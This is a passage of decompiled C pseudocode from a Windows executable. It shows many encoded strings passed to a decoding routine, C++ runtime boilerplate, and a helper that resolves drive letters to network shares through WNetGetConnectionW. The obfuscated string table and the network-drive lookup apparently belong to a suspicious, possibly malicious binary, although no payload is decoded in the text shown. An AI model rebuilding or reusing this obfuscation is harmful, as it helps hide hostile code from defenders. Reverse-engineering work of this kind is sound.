  sub_40A390(&dword_4FA360, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_48D7A0);
}

//----- (004033C0) --------------------------------------------------------
int sub_4033C0()
{
  sub_40A390(&dword_4FA450, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_48D800);
}

//----- (004033E0) --------------------------------------------------------
int sub_4033E0()
{
  sub_40A390(&dword_4FA288, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_48D860);
}

//----- (00403400) --------------------------------------------------------
int sub_403400()
{
  sub_40A390(&dword_4FA2A0, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_48D8C0);
}

//----- (00403420) --------------------------------------------------------
int sub_403420()
{
  sub_40A390(&dword_4FA4F8, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_48D920);
}

//----- (00403440) --------------------------------------------------------
int sub_403440()
{
  sub_40A390(&dword_4FA498, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_48D980);
}

//----- (00403460) --------------------------------------------------------
int sub_403460()
{
  sub_40A390(&dword_4FA168, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_48D9E0);
}

//----- (00403480) --------------------------------------------------------
int sub_403480()
{
  sub_40A390(&dword_4FA3C0, "BggZ", 4u);
  return atexit(sub_48DA40);
}

//----- (004034A0) --------------------------------------------------------
int sub_4034A0()
{
  sub_40A390(&dword_4FA378, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_48DAA0);
}

//----- (004034C0) --------------------------------------------------------
int sub_4034C0()
{
  sub_40A390(&dword_4FA588, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_48DC70);
}

//----- (004034E0) --------------------------------------------------------
int sub_4034E0()
{
  sub_40A390(&dword_4FA8D0, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_48DCD0);
}

//----- (00403500) --------------------------------------------------------
int sub_403500()
{
  sub_40A390(&dword_4FA708, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_48DD30);
}

//----- (00403520) --------------------------------------------------------
int sub_403520()
{
  sub_40A390(&dword_4FA648, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_48DD90);
}

//----- (00403540) --------------------------------------------------------
int sub_403540()
{
  sub_40A390(&dword_4FA7C8, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_48DDF0);
}

//----- (00403560) --------------------------------------------------------
int sub_403560()
{
  sub_40A390(&dword_4FA918, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_48DE50);
}

//----- (00403580) --------------------------------------------------------
int sub_403580()
{
  sub_40A390(&dword_4FA750, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_48DEB0);
}

//----- (004035A0) --------------------------------------------------------
int sub_4035A0()
{
  sub_40A390(&dword_4FA900, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_48DF10);
}

//----- (004035C0) --------------------------------------------------------
int sub_4035C0()
{
  sub_40A390(&dword_4FA768, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_48DF70);
}

//----- (004035E0) --------------------------------------------------------
int sub_4035E0()
{
  sub_40A390(&dword_4FA978, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_48DFD0);
}

//----- (00403600) --------------------------------------------------------
int sub_403600()
{
  sub_40A390(&dword_4FA8A0, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_48E030);
}

//----- (00403620) --------------------------------------------------------
int sub_403620()
{
  sub_40A390(&dword_4FA9F0, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_48E090);
}

//----- (00403640) --------------------------------------------------------
int sub_403640()
{
  sub_40A390(&dword_4FA828, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_48E0F0);
}

//----- (00403660) --------------------------------------------------------
int sub_403660()
{
  sub_40A390(&dword_4FA780, "FRgDEQwC", 8u);
  return atexit(sub_48E150);
}

//----- (00403680) --------------------------------------------------------
int sub_403680()
{
  sub_40A390(&dword_4FA798, "GRAV", 4u);
  return atexit(sub_48E1B0);
}

//----- (004036A0) --------------------------------------------------------
int sub_4036A0()
{
  sub_40A390(&dword_4FA660, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_48E210);
}

//----- (004036C0) --------------------------------------------------------
int sub_4036C0()
{
  sub_40A390(&dword_4FA7E0, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_48E270);
}

//----- (004036E0) --------------------------------------------------------
int sub_4036E0()
{
  sub_40A390(&dword_4FA840, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_48E2D0);
}

//----- (00403700) --------------------------------------------------------
int sub_403700()
{
  sub_40A390(&dword_4FA8B8, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_48E330);
}

//----- (00403720) --------------------------------------------------------
int sub_403720()
{
  sub_40A390(&dword_4FA888, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_48E390);
}

//----- (00403740) --------------------------------------------------------
int sub_403740()
{
  sub_40A390(&dword_4FA6F0, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_48E3F0);
}

//----- (00403760) --------------------------------------------------------
int sub_403760()
{
  sub_40A390(&dword_4FA5B8, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_48E450);
}

//----- (00403780) --------------------------------------------------------
int sub_403780()
{
  sub_40A390(&dword_4FA618, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_48E4B0);
}

//----- (004037A0) --------------------------------------------------------
int sub_4037A0()
{
  sub_40A390(&dword_4FA9C0, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_48E510);
}

//----- (004037C0) --------------------------------------------------------
int sub_4037C0()
{
  sub_40A390(&dword_4FA9A8, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_48E570);
}

//----- (004037E0) --------------------------------------------------------
int sub_4037E0()
{
  sub_40A390(
    &dword_4FA5E8,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_48E5D0);
}

//----- (00403800) --------------------------------------------------------
int sub_403800()
{
  sub_40A390(&dword_4FA7B0, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_48E630);
}

//----- (00403820) --------------------------------------------------------
int sub_403820()
{
  sub_40A390(&dword_4FA5D0, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_48E690);
}

//----- (00403840) --------------------------------------------------------
int sub_403840()
{
  sub_40A390(&dword_4FA948, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_48E6F0);
}

//----- (00403860) --------------------------------------------------------
int sub_403860()
{
  sub_40A390(&dword_4FA630, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_48E750);
}

//----- (00403880) --------------------------------------------------------
int sub_403880()
{
  sub_40A390(&dword_4FA6A8, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_48E7B0);
}

//----- (004038A0) --------------------------------------------------------
int sub_4038A0()
{
  sub_40A390(&dword_4FA6D8, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_48E810);
}

//----- (004038C0) --------------------------------------------------------
int sub_4038C0()
{
  sub_40A390(&dword_4FA678, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_48E870);
}

//----- (004038E0) --------------------------------------------------------
int sub_4038E0()
{
  sub_40A390(&dword_4FA9D8, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_48E8D0);
}

//----- (00403900) --------------------------------------------------------
int sub_403900()
{
  sub_40A390(&dword_4FA6C0, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_48E930);
}

//----- (00403920) --------------------------------------------------------
int sub_403920()
{
  sub_40A390(&dword_4FA690, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_48E990);
}

//----- (00403940) --------------------------------------------------------
int sub_403940()
{
  sub_40A390(&dword_4FA5A0, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_48E9F0);
}

//----- (00403960) --------------------------------------------------------
int sub_403960()
{
  sub_40A390(&dword_4FAA08, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_48EA50);
}

//----- (00403980) --------------------------------------------------------
int sub_403980()
{
  sub_40A390(&dword_4FA870, "OjosKUBA", 8u);
  return atexit(sub_48EAB0);
}

//----- (004039A0) --------------------------------------------------------
int sub_4039A0()
{
  sub_40A390(&dword_4FA960, "ODUpJDko", 8u);
  return atexit(sub_48EB10);
}

//----- (004039C0) --------------------------------------------------------
int sub_4039C0()
{
  sub_40A390(&dword_4FA7F8, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_48EB70);
}

//----- (004039E0) --------------------------------------------------------
int sub_4039E0()
{
  sub_40A390(&dword_4FA8E8, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_48EBD0);
}

//----- (00403A00) --------------------------------------------------------
int sub_403A00()
{
  sub_40A390(&dword_4FA720, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_48EC30);
}

//----- (00403A20) --------------------------------------------------------
int sub_403A20()
{
  sub_40A390(&dword_4FA738, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_48EC90);
}

//----- (00403A40) --------------------------------------------------------
int sub_403A40()
{
  sub_40A390(&dword_4FA990, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_48ECF0);
}

//----- (00403A60) --------------------------------------------------------
int sub_403A60()
{
  sub_40A390(&dword_4FA930, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_48ED50);
}

//----- (00403A80) --------------------------------------------------------
int sub_403A80()
{
  sub_40A390(&dword_4FA600, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_48EDB0);
}

//----- (00403AA0) --------------------------------------------------------
int sub_403AA0()
{
  sub_40A390(&dword_4FA858, "BggZ", 4u);
  return atexit(sub_48EE10);
}

//----- (00403AC0) --------------------------------------------------------
int sub_403AC0()
{
  sub_40A390(&dword_4FA810, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_48EE70);
}

//----- (00403ADD) --------------------------------------------------------
int sub_403ADD()
{
  sub_42F834(&unk_4FF758);
  return atexit(sub_48EEC6);
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);

//----- (00403B0F) --------------------------------------------------------
int sub_403B0F()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4FF754);
  return atexit(sub_48EF3C);
}

//----- (00403B25) --------------------------------------------------------
int sub_403B25()
{
  return atexit(Concurrency::details::`anonymous namespace'::`dynamic atexit destructor for '_Task_scheduler_main_block_instance'');
}

//----- (00403B31) --------------------------------------------------------
int sub_403B31()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4FF930);
  return atexit(sub_48EF46);
}

//----- (00403B47) --------------------------------------------------------
int sub_403B47()
{
  return atexit(sub_48EF5A);
}

//----- (00403B53) --------------------------------------------------------
int sub_403B53()
{
  return atexit(sub_48EF50);
}

//----- (00403B5F) --------------------------------------------------------
int sub_403B5F()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4FFC10);
  return atexit(sub_48EF6E);
}

//----- (00403B75) --------------------------------------------------------
int sub_403B75()
{
  return atexit(sub_48EF64);
}

//----- (00403B90) --------------------------------------------------------
int sub_403B90()
{
  return atexit(sub_48EF80);
}

//----- (00403B9C) --------------------------------------------------------
int sub_403B9C()
{
  return atexit(sub_48EF8C);
}

//----- (00403BA8) --------------------------------------------------------
FILE *sub_403BA8()
{
  FILE *result; // eax

  result = __acrt_iob_func(2u);
  dword_4FFFF0 = (int)result;
  return result;
}
// 4FFFF0: using guessed type int dword_4FFFF0;

//----- (00403BB6) --------------------------------------------------------
uintptr_t sub_403BB6()
{
  uintptr_t result; // eax

  result = sub_44ABE9();
  dword_500054 = result;
  return result;
}
// 500054: using guessed type int dword_500054;

//----- (00403BC1) --------------------------------------------------------
void sub_403BC1()
{
  InitializeSListHead(&ListHead);
}

//----- (00403C10) --------------------------------------------------------
char *__thiscall sub_403C10(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';

//----- (00403C60) --------------------------------------------------------
const char *__thiscall sub_403C60(_DWORD *this)
{
  int v1; // ecx
  const char *result; // eax

  v1 = this[1];
  result = "Unknown exception";
  if ( v1 )
    return (const char *)v1;
  return result;
}

//----- (00403C70) --------------------------------------------------------
char *__thiscall sub_403C70(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 45E423: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 48F974: using guessed type void *std::exception::`vftable';

//----- (00403CA0) --------------------------------------------------------
char *__thiscall sub_403CA0(char *this)
{
  char *result; // eax

  result = this;
  *(_QWORD *)(this + 4) = 0i64;
  *((_DWORD *)this + 1) = "bad array new length";
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return result;
}
// 48FAA4: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00403CC0) --------------------------------------------------------
void __noreturn sub_403CC0()
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_403CA0(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 403CC0: using guessed type void __noreturn sub_403CC0();

//----- (00403CE0) --------------------------------------------------------
char *__thiscall sub_403CE0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48FAA4: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00403D20) --------------------------------------------------------
char *__thiscall sub_403D20(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48F980: using guessed type void *std::bad_alloc::`vftable';

//----- (00403D90) --------------------------------------------------------
char *__thiscall sub_403D90(int *this, int a2)
{
  int v3; // ecx
  char *result; // eax

  v3 = this[1];
  if ( v3 == this[2] )
    return sub_404640(this, v3, a2);
  *(_DWORD *)(v3 + 16) = 0;
  *(_DWORD *)(v3 + 20) = 0;
  *(_OWORD *)v3 = *(_OWORD *)a2;
  *(_QWORD *)(v3 + 16) = *(_QWORD *)(a2 + 16);
  *(_WORD *)a2 = 0;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  result = (char *)this[1];
  this[1] = (int)(result + 24);
  return result;
}

//----- (00403DF0) --------------------------------------------------------
int __userpurge sub_403DF0@<eax>(int a1@<ebp>, int a2, WCHAR a3)
{
  WCHAR *v3; // eax
  unsigned int v4; // edi
  __int128 *v5; // eax
  unsigned int v6; // esi
  __int128 *v7; // ecx
  __int128 *v8; // edx
  __int128 *v9; // eax
  __int128 *v10; // eax
  __int128 *v11; // edx
  __int128 *v12; // eax
  unsigned int v13; // edx
  unsigned int v14; // ecx
  __int128 *v15; // eax
  int result; // eax
  __int128 v17; // xmm0
  char *v18; // [esp+8h] [ebp-48h]
  DWORD v19; // [esp+Ch] [ebp-44h] BYREF
  __int128 v20; // [esp+10h] [ebp-40h] BYREF
  __int64 v21; // [esp+20h] [ebp-30h]
  WCHAR v22; // [esp+28h] [ebp-28h] BYREF
  int v23; // [esp+2Ah] [ebp-26h]
  int *v24; // [esp+34h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+38h] [ebp-18h]
  void *v26; // [esp+3Ch] [ebp-14h]
  int v27; // [esp+40h] [ebp-10h]
  int v28; // [esp+44h] [ebp-Ch]
  int v29; // [esp+48h] [ebp-8h]
  int v30; // [esp+4Ch] [ebp-4h] BYREF
  int retaddr; // [esp+50h] [ebp+0h]

  v28 = a1;
  v29 = retaddr;
  v27 = -1;
  v26 = &loc_481640;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v24 = &v30;
  v23 = 58;
  v22 = a3;
  v19 = 260;
  sub_404120(&v20, 0x104u, 0);
  v3 = (WCHAR *)&v20;
  if ( HIDWORD(v21) >= 8 )
    v3 = (WCHAR *)v20;
  WNetGetConnectionW(&v22, v3, &v19);
  v4 = HIDWORD(v21);
  v5 = &v20;
  v6 = v21;
  v7 = &v20;
  v8 = (__int128 *)v20;
  if ( HIDWORD(v21) >= 8 )
  {
    v5 = (__int128 *)v20;
    v7 = (__int128 *)v20;
  }
  v18 = (char *)v5 + 2 * v21;
  v9 = &v20;
  if ( HIDWORD(v21) >= 8 )
    v9 = (__int128 *)v20;
  v10 = (__int128 *)((char *)v9 + 2 * v21);
  if ( v7 != v10 )
  {
    do
    {
      if ( !*(_WORD *)v7 )
        break;
      v7 = (__int128 *)((char *)v7 + 2);
    }
    while ( v7 != v10 );
    if ( v7 != v10 )
    {
      v11 = (__int128 *)((char *)v7 + 2);
      if ( (__int128 *)((char *)v7 + 2) != v10 )
      {
        do
        {
          if ( *(_WORD *)v11 )
          {
            *(_WORD *)v7 = *(_WORD *)v11;
            v7 = (__int128 *)((char *)v7 + 2);
          }
          v11 = (__int128 *)((char *)v11 + 2);
        }
        while ( v11 != v10 );
        v4 = HIDWORD(v21);
        v6 = v21;
      }
      v8 = (__int128 *)v20;
    }
  }
  v27 = 0;
  v12 = &v20;
  if ( v4 >= 8 )
    v12 = v8;
  v13 = ((char *)v7 - (char *)v12) >> 1;
  if ( v6 < v13 )
    sub_404630();
  v14 = (v18 - (char *)v7) >> 1;
  if ( v6 - v13 < v14 )
    v14 = v6 - v13;
  v15 = &v20;
  if ( v4 >= 8 )
    v15 = (__int128 *)v20;
  LODWORD(v21) = v6 - v14;
  memmove_0((char *)v15 + 2 * v13, (char *)v15 + 2 * v13 + 2 * v14, 2 * (v6 - v14 - v13) + 2);
  result = a2;
  v17 = v20;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_OWORD *)a2 = v17;
  *(_QWORD *)(a2 + 16) = v21;
  return result;
}
// 403DF0: could not find valid save-restore pair for ebp
// 404630: using guessed type void __noreturn sub_404630(void);

//----- (00404010) --------------------------------------------------------
_DWORD *__thiscall sub_404010(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // edi
  unsigned int v7; // edx
  _DWORD *v8; // eax
  unsigned int v9; // ebx
  _DWORD *result; // eax

  v4 = this;
  if ( this[5] >= 8u )
    this = (_DWORD *)*this;
  v5 = v4[4];
  v6 = (a3 - (int)this) >> 1;
  v7 = (a4 - a3) >> 1;
  if ( v5 < v6 )
    sub_404630();
  if ( v5 - v6 < v7 )
    v7 = v5 - v6;
  v8 = v4;
  if ( v4[5] >= 8u )
    v8 = (_DWORD *)*v4;
  v9 = v5 - v7;
  v4[4] = v9;
  memmove_0((char *)v8 + 2 * v6, (char *)v8 + 2 * v6 + 2 * v7, 2 * (v9 - v6) + 2);
  if ( v4[5] >= 8u )
    v4 = (_DWORD *)*v4;
  result = a2;
  *a2 = (char *)v4 + 2 * v6;
  return result;
}
// 404630: using guessed type void __noreturn sub_404630(void);

//----- (004040C0) --------------------------------------------------------
int __thiscall sub_4040C0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00404120) --------------------------------------------------------
_WORD *__thiscall sub_404120(_WORD *this, unsigned int a2, unsigned __int16 a3)
{
  unsigned int *v4; // eax
  unsigned int *v5; // ecx
  unsigned __int16 *v6; // edi
  int j; // ecx
  _WORD *result; // eax
  unsigned int v9; // edi
  unsigned int v10; // eax
  _DWORD *v11; // esi
  unsigned __int16 *v12; // edi
  int i; // ecx
  unsigned int *v15; // [esp+10h] [ebp-8h]
  unsigned int *v16; // [esp+14h] [ebp-4h]

  v4 = (unsigned int *)(this + 8);
  v16 = v4;
  v5 = (unsigned int *)(this + 10);
  v15 = v5;
  *v4 = 0;
  *v5 = 7;
  *this = 0;
  if ( a2 > 7 )
  {
    if ( a2 > 0x7FFFFFFE )
      sub_404900();
    v9 = a2 | 7;
    if ( (a2 | 7) <= 0x7FFFFFFE )
    {
      v16 = v4;
      v15 = v5;
      if ( v9 < 0xA )
        v9 = 10;
      v10 = v9 + 1;
    }
    else
    {
      v9 = 2147483646;
      v10 = 0x7FFFFFFF;
    }
    v11 = sub_404910(v10);
    *v16 = a2;
    *v15 = v9;
    memset32(v11, (a3 << 16) | a3, a2 >> 1);
    v12 = (unsigned __int16 *)&v11[a2 >> 1];
    for ( i = a2 & 1; i; --i )
      *v12++ = a3;
    *((_WORD *)v11 + a2) = 0;
    result = this;
    *(_DWORD *)this = v11;
  }
  else
  {
    *v4 = a2;
    if ( a2 )
    {
      memset32(this, (a3 << 16) | a3, a2 >> 1);
      v6 = &this[2 * (a2 >> 1)];
      for ( j = a2 & 1; j; --j )
        *v6++ = a3;
    }
    this[a2] = 0;
    return this;
  }
  return result;
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00404200) --------------------------------------------------------
_DWORD *__thiscall sub_404200(_DWORD *this, unsigned int a2, unsigned __int16 a3)
{
  unsigned int v4; // ecx
  char *v5; // edx
  char *v6; // edi
  int j; // ecx
  unsigned int v9; // edi
  unsigned int v10; // edx
  _DWORD *v11; // eax
  _DWORD *v12; // edx
  unsigned __int16 *v13; // edi
  int i; // ecx
  _DWORD *v15; // eax
  unsigned int v16; // [esp+Ch] [ebp-8h]
  _DWORD *v17; // [esp+10h] [ebp-4h]
  _DWORD *v18; // [esp+10h] [ebp-4h]

  v4 = this[5];
  v16 = v4;
  if ( a2 > v4 )
  {
    if ( a2 > 0x7FFFFFFE )
      sub_404900();
    v9 = a2 | 7;
    if ( (a2 | 7) <= 0x7FFFFFFE )
    {
      v10 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v9 < v10 + v4 )
          v9 = v10 + v4;
      }
      else
      {
        v9 = 2147483646;
      }
    }
    else
    {
      v9 = 2147483646;
    }
    v11 = sub_404910(v9 + 1);
    this[4] = a2;
    v12 = v11;
    v18 = v11;
    this[5] = v9;
    if ( a2 )
    {
      v12 = v11;
      memset32(v11, (a3 << 16) | a3, a2 >> 1);
      v13 = (unsigned __int16 *)&v11[a2 >> 1];
      for ( i = a2 & 1; i; --i )
        *v13++ = a3;
    }
    *((_WORD *)v12 + a2) = 0;
    if ( v16 >= 8 )
    {
      v15 = (_DWORD *)*this;
      if ( 2 * v16 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v15 - *(v15 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v15 = (_DWORD *)*(v15 - 1);
      }
      sub_44775B(v15);
      v12 = v18;
    }
    *this = v12;
    return this;
  }
  else
  {
    v17 = this;
    v5 = (char *)this;
    if ( v4 >= 8 )
    {
      v5 = (char *)*this;
      v17 = (_DWORD *)*this;
    }
    this[4] = a2;
    if ( a2 )
    {
      memset32(v5, (a3 << 16) | a3, a2 >> 1);
      v6 = &v5[4 * (a2 >> 1)];
      for ( j = a2 & 1; j; --j )
      {
        *(_WORD *)v6 = a3;
        v6 += 2;
      }
    }
    *((_WORD *)v17 + a2) = 0;
    return this;
  }
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00404330) --------------------------------------------------------
_DWORD *__thiscall sub_404330(_DWORD *this, void *a2, unsigned int a3)
{
  _DWORD *v3; // edi
  unsigned int v4; // ebx
  unsigned int v6; // esi
  unsigned int v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // [esp+14h] [ebp-4h]
  _DWORD *v12; // [esp+14h] [ebp-4h]

  v3 = this;
  v4 = this[5];
  if ( a3 > v4 )
  {
    if ( a3 > 0x7FFFFFFE )
      sub_404900();
    v6 = a3 | 7;
    if ( (a3 | 7) <= 0x7FFFFFFE )
    {
      v7 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v6 < v7 + v4 )
          v6 = v7 + v4;
      }
      else
      {
        v6 = 2147483646;
      }
    }
    else
    {
      v6 = 2147483646;
    }
    v8 = sub_404910(v6 + 1);
    v3[5] = v6;
    v12 = v8;
    v3[4] = a3;
    memmove(v8, a2, 2 * a3);
    v9 = v12;
    *((_WORD *)v12 + a3) = 0;
    if ( v4 >= 8 )
    {
      v10 = (_DWORD *)*v3;
      if ( 2 * v4 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v10 - *(v10 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v10 = (_DWORD *)*(v10 - 1);
      }
      sub_44775B(v10);
      v9 = v12;
    }
    *v3 = v9;
    return v3;
  }
  else
  {
    v11 = this;
    if ( v4 >= 8 )
    {
      this = (_DWORD *)*this;
      v11 = (_DWORD *)*v3;
    }
    v3[4] = a3;
    memmove_0(this, a2, 2 * a3);
    *((_WORD *)v11 + a3) = 0;
    return v3;
  }
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00404440) --------------------------------------------------------
void __stdcall sub_404440(int a1, int a2)
{
  sub_4047B0(a1, a2);
}

//----- (00404460) --------------------------------------------------------
void __stdcall sub_404460(_DWORD *Block, int a2)
{
  void *v2; // ecx

  v2 = Block;
  if ( (unsigned int)(24 * a2) >= 0x1000 )
  {
    if ( (unsigned int)Block - *(Block - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*(Block - 1);
  }
  sub_44775B(v2);
}

//----- (004044A0) --------------------------------------------------------
_DWORD *__thiscall sub_4044A0(_DWORD *Src, const void *a2, unsigned int a3)
{
  unsigned int v4; // ebx
  int v5; // edx
  _DWORD *v6; // edi
  unsigned int v8; // edi
  unsigned int v9; // ecx
  _DWORD *v10; // eax
  size_t v11; // edi
  int v12; // edx
  _DWORD *v13; // edi
  void *v14; // [esp+10h] [ebp-10h]
  void *v15; // [esp+10h] [ebp-10h]
  void *v16; // [esp+14h] [ebp-Ch]
  char *v17; // [esp+14h] [ebp-Ch]
  int Size; // [esp+18h] [ebp-8h]
  int v19; // [esp+1Ch] [ebp-4h]
  _WORD *v20; // [esp+1Ch] [ebp-4h]

  v4 = Src[5];
  v5 = Src[4];
  v19 = v5;
  if ( a3 > v4 - v5 )
  {
    if ( 2147483646 - v5 < a3 )
      sub_404900();
    v16 = (void *)(a3 + v5);
    v8 = (a3 + v5) | 7;
    if ( v8 <= 0x7FFFFFFE )
    {
      v9 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v8 < v9 + v4 )
          v8 = v9 + v4;
      }
      else
      {
